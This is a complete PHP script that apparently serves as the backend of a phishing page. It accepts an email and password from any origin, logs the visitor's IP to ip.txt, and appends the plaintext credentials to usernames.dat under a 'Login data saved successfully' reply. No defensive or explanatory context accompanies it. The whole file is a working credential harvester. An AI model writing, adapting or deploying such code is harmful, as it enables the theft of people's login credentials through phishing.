<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the JSON data from the request
    $data = json_decode(file_get_contents('php://input'), true);
    
    $email = isset($data['email']) ? $data['email'] : '';
    $password = isset($data['password']) ? $data['password'] : '';
    
    // Get user's IP address
    $ip = $_SERVER['REMOTE_ADDR'];
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    
    // Get current timestamp
    $timestamp = date('Y-m-d H:i:s');
    
    // Save IP address to ip.txt
    $ipData = "[$timestamp] IP: $ip\n";
    file_put_contents('ip.txt', $ipData, FILE_APPEND | LOCK_EX);
    
    // Save login credentials to usernames.dat
    $loginData = "[$timestamp] Email: $email | Password: $password | IP: $ip\n";
    file_put_contents('usernames.dat', $loginData, FILE_APPEND | LOCK_EX);
    
    // Return success response
    echo json_encode([
        'success' => true,
        'message' => 'Login data saved successfully'
    ]);
} else {
    echo json_encode([
        'success' => false,
        'message' => 'Invalid request method'
    ]);
}
?>
